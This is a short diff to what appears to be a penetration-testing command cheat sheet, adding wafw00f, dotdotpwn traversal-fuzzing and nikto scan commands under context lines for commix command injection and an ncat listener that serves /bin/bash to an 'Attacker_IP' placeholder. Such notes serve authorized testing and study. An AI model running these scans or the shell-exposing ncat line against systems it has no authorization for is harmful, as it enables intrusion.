@@ -1007,6 +1007,18 @@ ncat -lvnp Attacker_IP PORT_NUM -e /bin/bash
 
 commix --url="http://10.10.10.10/OS.php" --cookie="cookie" --data="data"
 
+# wafw00f #
+
+wafw00f URL
+
+# DotDotPWN #
+
+dotdotpwn -m http -h URL -S  
+
+# Nikto #
+
+nikto -h URL
+
 
 
 
